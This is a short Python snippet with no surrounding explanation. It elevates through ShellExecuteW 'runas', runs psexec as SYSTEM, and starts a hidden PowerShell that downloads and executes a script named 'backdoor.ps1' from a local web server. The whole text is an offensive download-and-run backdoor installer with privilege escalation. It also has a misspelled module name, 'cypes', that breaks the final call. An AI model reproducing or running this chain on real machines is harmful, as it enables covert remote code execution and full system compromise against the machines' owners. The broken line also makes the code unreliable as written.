import ctypes
shell = "powershell.exe -nop -w hidden -c IEX ((new-object \
net.webclient).downloadstring('http://localhost:8080/backdoor.ps1'))"
cypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", \
u"-accepteula -nobanner -s " + shell, None, 0)
